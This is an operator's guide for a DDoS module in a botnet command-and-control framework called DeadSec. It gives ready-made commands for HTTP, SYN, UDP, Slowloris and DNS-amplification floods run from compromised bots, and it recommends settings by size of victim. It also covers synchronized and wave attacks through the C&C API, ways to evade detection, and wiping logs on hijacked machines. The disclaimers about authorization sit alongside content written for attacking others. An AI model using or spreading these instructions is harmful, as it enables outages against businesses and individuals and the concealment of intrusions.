# 💀 DeadSec DDoS Attack Module Guide

## ⚠️ CRITICAL WARNING ⚠️

**DDoS (Distributed Denial of Service) attacks are ILLEGAL without explicit authorization.**

This module is provided EXCLUSIVELY for:
- Authorized penetration testing with written permission
- Red team exercises within controlled environments
- Security research on systems you own
- Stress testing your own infrastructure

**Unauthorized use can result in:**
- Federal criminal charges
- Imprisonment (up to 10 years in many jurisdictions)
- Massive fines
- Civil lawsuits
- Permanent criminal record

**DeadSec is not responsible for misuse of this tool.**

---

## Overview

The DDoS Attack Module enables coordinated distributed denial of service attacks from compromised bot networks. It supports multiple attack vectors designed to overwhelm different types of targets.

### Available Attack Types

#### 1. **HTTP Flood** 🌐
- **Target**: Web servers, web applications
- **Method**: Rapid HTTP GET/POST requests
- **Effect**: Exhausts web server connections and CPU
- **Best For**: Apache, Nginx, IIS servers
- **Detection Risk**: High (easily logged)

#### 2. **TCP SYN Flood** ⚡
- **Target**: Any TCP service (web, SSH, FTP, etc.)
- **Method**: Half-open TCP connections
- **Effect**: Exhausts connection table and memory
- **Best For**: General purpose attack on any service
- **Detection Risk**: Medium

#### 3. **UDP Flood** 📡
- **Target**: UDP services (DNS, game servers, VoIP)
- **Method**: Massive UDP packet storm
- **Effect**: Saturates bandwidth and processing
- **Best For**: Game servers, streaming services
- **Detection Risk**: Low (connectionless protocol)

#### 4. **Slowloris Attack** 🐌
- **Target**: Web servers (Apache especially vulnerable)
- **Method**: Keeps connections open with partial requests
- **Effect**: Connection exhaustion with minimal bandwidth
- **Best For**: Apache servers, low-bandwidth scenarios
- **Detection Risk**: Medium (unusual connection patterns)

#### 5. **DNS Amplification** 💥
- **Target**: Any network infrastructure
- **Method**: Abuses DNS servers to amplify traffic
- **Effect**: High bandwidth saturation (20x-50x amplification)
- **Best For**: Maximum damage with minimal resources
- **Detection Risk**: High (traceable to DNS servers)

---

## Usage

### Python Version (Cross-Platform)

```bash
# Basic HTTP flood
python payloads/ddos_attack.py -t example.com -a http -T 100 -d 60

# TCP SYN flood on port 22 (SSH)
python payloads/ddos_attack.py -t 192.168.1.100 -p 22 -a tcp -T 200 -d 120

# UDP flood on game server
python payloads/ddos_attack.py -t gameserver.com -p 27015 -a udp -T 150 -d 300

# Slowloris attack (low bandwidth, high impact)
python payloads/ddos_attack.py -t vulnerable-site.com -a slowloris -T 50 -d 600

# DNS amplification (massive bandwidth)
python payloads/ddos_attack.py -t victim-ip.com -a dns -T 100 -d 180
```

### PowerShell Version (Windows)

```powershell
# HTTP flood attack
.\payloads\windows_ddos.ps1 -Target "example.com" -AttackType HTTP -Threads 100 -Duration 60

# TCP attack on specific port
.\payloads\windows_ddos.ps1 -Target "192.168.1.100" -Port 8080 -AttackType TCP -Threads 150 -Duration 120

# UDP flood
.\payloads\windows_ddos.ps1 -Target "target.com" -Port 53 -AttackType UDP -Threads 200 -Duration 300

# Slowloris attack
.\payloads\windows_ddos.ps1 -Target "apache-server.com" -AttackType Slowloris -Threads 50 -Duration 600

# DNS amplification
.\payloads\windows_ddos.ps1 -Target "victim.com" -AttackType DNS -Threads 100 -Duration 180
```

### Web GUI

1. Navigate to **Weapon Deployment** page
2. Select a compromised bot from **Compromised Assets**
3. Click **💥 DDoS Attack** button
4. Configure attack parameters:
   - **Target**: IP address or domain name
   - **Port**: Target service port (80, 443, 22, etc.)
   - **Attack Type**: Choose from 5 attack vectors
   - **Threads**: Number of concurrent attack threads (50-500)
   - **Duration**: Attack duration in seconds (10-600)
5. Click **LAUNCH ATTACK**
6. Monitor attack status in console output

---

## Command-Line Arguments

### Python Version

| Argument | Short | Description | Default | Required |
|----------|-------|-------------|---------|----------|
| `--target` | `-t` | Target IP or domain | - | ✓ |
| `--port` | `-p` | Target port number | 80 | ✗ |
| `--attack` | `-a` | Attack type | http | ✗ |
| `--threads` | `-T` | Number of threads | 100 | ✗ |
| `--duration` | `-d` | Duration in seconds | 60 | ✗ |

### PowerShell Version

| Parameter | Description | Default | Required |
|-----------|-------------|---------|----------|
| `-Target` | Target IP or domain | - | ✓ |
| `-Port` | Target port number | 80 | ✗ |
| `-AttackType` | HTTP/TCP/UDP/Slowloris/DNS | HTTP | ✗ |
| `-Threads` | Number of threads | 50 | ✗ |
| `-Duration` | Duration in seconds | 60 | ✗ |

---

## Attack Configuration Recommendations

### Small Target (Personal Server)
```
Threads: 50-100
Duration: 60-120 seconds
Attack Type: HTTP or Slowloris
```

### Medium Target (Small Business)
```
Threads: 100-200
Duration: 120-300 seconds
Attack Type: TCP or UDP
```

### Large Target (Enterprise)
```
Threads: 200-500
Duration: 300-600 seconds
Attack Type: DNS Amplification or combined
```

### Stealth Attack (Avoid Detection)
```
Threads: 20-50
Duration: 600+ seconds
Attack Type: Slowloris
Note: Low profile, harder to detect
```

---

## Distributed Attack Strategy

For maximum effectiveness, coordinate attacks across multiple bots:

### Method 1: Sequential Launch
```bash
# Bot 1
python ddos_attack.py -t target.com -a http -T 100 -d 300

# Bot 2 (2 seconds later)
python ddos_attack.py -t target.com -a tcp -T 100 -d 300

# Bot 3 (2 seconds later)
python ddos_attack.py -t target.com -a udp -T 100 -d 300
```

### Method 2: Synchronized Launch
Use DeadSec C&C to launch on all bots simultaneously:

```javascript
// In Web GUI console or via API
bots.forEach(bot => {
    deployDDoS(bot, 'target.com', 80, 'http', 100, 300);
});
```

### Method 3: Wave Attack
Launch attacks in waves with breaks to evade detection:

```
Wave 1: 0-60s   (50 threads)
Break:  60-90s  (no traffic)
Wave 2: 90-150s (100 threads)
Break:  150-180s (no traffic)
Wave 3: 180-300s (150 threads)
```

---

## Attack Effectiveness Matrix

| Target Type | Best Attack | Threads | Notes |
|-------------|-------------|---------|-------|
| Apache Web Server | Slowloris | 50-100 | Very effective |
| Nginx Web Server | HTTP Flood | 200+ | Nginx handles Slowloris well |
| SSH Server | TCP SYN | 100-200 | Connection exhaustion |
| Game Server | UDP Flood | 200-500 | High packet rate needed |
| DNS Server | DNS Amp | 100+ | Amplification factor: 20-50x |
| Load Balancer | HTTP Flood | 300+ | Need high volume |
| API Endpoint | HTTP Flood | 150-300 | Target specific endpoints |

---

## Defense Evasion

### Randomization
- Scripts randomize user agents
- Random URL parameters
- Variable packet sizes
- Timing jitter

### Distributed Source
- Use multiple bots from different networks
- Spread attacks across time zones
- Mix IPv4 and IPv6 if available

### Low and Slow
- Slowloris is hardest to detect
- Appears as legitimate slow connections
- Use fewer threads over longer duration

---

## Detection and Countermeasures

### How Targets Detect DDoS:

1. **Traffic Volume**: Sudden spike in requests
2. **Pattern Recognition**: Repetitive requests from same IPs
3. **Connection Behavior**: Many half-open connections
4. **Resource Exhaustion**: CPU/Memory/Bandwidth alerts
5. **Rate Limiting**: Too many requests per second

### Countermeasures Targets May Use:

- **WAF (Web Application Firewall)**: Blocks malicious patterns
- **Rate Limiting**: Throttles requests per IP
- **Geo-Blocking**: Blocks traffic from certain countries
- **CDN**: Distributes load across servers (Cloudflare, Akamai)
- **SYN Cookies**: Prevents SYN flood attacks
- **Connection Limits**: Max connections per IP

---

## Monitoring Attack Status

### Real-Time Statistics

Both Python and PowerShell versions display:
- **Packets Sent**: Total attack packets transmitted
- **Packets/Second**: Attack rate
- **Time Remaining**: Countdown to completion

Example output:
```
[DEADSEC] ⚡ Attack Status: 45,231 packets sent | 754.38 pps | 42s remaining
```

### Success Indicators:

✓ **Target Unreachable**: Website/service goes down
✓ **Slow Response**: Target responds very slowly
✓ **Connection Timeouts**: Unable to establish new connections
✓ **Error Messages**: Target returns 503, 504 errors

### Failure Indicators:

✗ **No Effect**: Target remains fully responsive
✗ **IP Blocked**: Your bot IPs get blacklisted mid-attack
✗ **Attack Disrupted**: Connections dropped rapidly

---

## Post-Attack Operations

### Clean Up:
```bash
# Remove attack scripts from compromised systems
rm C:\Temp\ddos.ps1
rm /tmp/ddos_attack.py
```

### Log Analysis:
- Check attack statistics
- Verify target downtime
- Document effectiveness
- Plan follow-up actions

### Operational Security:
- Clear logs on compromised bots
- Rotate bot infrastructure
- Change C&C communication channels
- Monitor for detection/response

---

## Legal Considerations

### ALWAYS Required Before DDoS Testing:

1. ✓ **Written Authorization** from target owner
2. ✓ **Scope Document** defining allowed targets
3. ✓ **Timeframe Agreement** for testing window
4. ✓ **Emergency Contact** for immediate stop
5. ✓ **Insurance Coverage** for liability

### Professional Penetration Testing:

- Include DDoS testing in formal engagement contract
- Notify target's ISP if required
- Coordinate with target's incident response team
- Schedule attacks during low-traffic periods
- Have kill switch ready to stop immediately

### Red Team Exercises:

- Internal authorization from executive management
- Coordinate with blue team/SOC
- Define rules of engagement clearly
- Document all activities thoroughly
- Conduct post-exercise debrief

---

## Technical Details

### HTTP Flood Implementation:
```python
# Creates rapid HTTP GET requests with randomized parameters
# Mimics legitimate browser traffic with realistic user agents
# Keeps connections alive to maximize resource consumption
```

### TCP SYN Flood:
```python
# Sends SYN packets without completing handshake
# Fills target's connection table with half-open connections
# Prevents legitimate users from connecting
```

### UDP Flood:
```python
# Sends massive volume of UDP packets
# No handshake = maximum speed
# Saturates bandwidth and processing
```

### Slowloris:
```python
# Opens many connections with partial HTTP headers
# Sends periodic keep-alive packets to maintain connections
# Exhausts connection pool with minimal bandwidth
```

### DNS Amplification:
```python
# Sends small DNS queries to open resolvers
# Spoofs source IP to target's address
# Receives amplified responses (20-50x larger) at target
```

---

## Troubleshooting

### Attack Not Effective:

**Problem**: Target remains online and responsive

**Solutions**:
- Increase thread count (200-500)
- Try different attack type
- Use multiple bots simultaneously
- Target may have DDoS protection (Cloudflare, etc.)

### Script Crashes:

**Problem**: DDoS script terminates unexpectedly

**Solutions**:
- Reduce thread count (system resource limit)
- Check network connectivity
- Verify target is reachable
- Increase system file descriptor limit (Linux: `ulimit -n 65536`)

### Slow Attack Rate:

**Problem**: Low packets per second

**Solutions**:
- Check bot's network bandwidth
- Reduce thread count (may be overwhelming bot)
- Use UDP flood instead of TCP/HTTP
- Check for rate limiting on bot's network

---

## Integration with DeadSec Framework

### Web GUI Integration:
- **Dashboard**: Quick launch button for rapid deployment
- **Payloads Page**: Full configuration interface
- **Console**: Real-time attack monitoring
- **Bot Management**: Launch attacks from multiple bots

### API Integration:
```python
# Launch DDoS via API
import requests

payload = {
    'target': 'example.com',
    'port': 80,
    'attack_type': 'http',
    'threads': 100,
    'duration': 60
}

response = requests.post('http://cnc-server:5000/deploy_ddos', 
                        json=payload, 
                        params={'bot_id': 'bot-12345'})
```

---

## Conclusion

The DeadSec DDoS Attack Module provides professional-grade distributed denial of service capabilities for authorized security testing. Use responsibly, always obtain proper authorization, and understand the legal implications.

**Remember**: With great power comes great responsibility. DDoS attacks can cause significant harm. Only use this tool ethically and legally.

```
💀 DEADSEC // WE DO NOT FORGIVE // WE DO NOT FORGET 💀
```

---

**Last Updated**: November 2025
**Version**: 2.0.0
**Module**: DDoS Attack
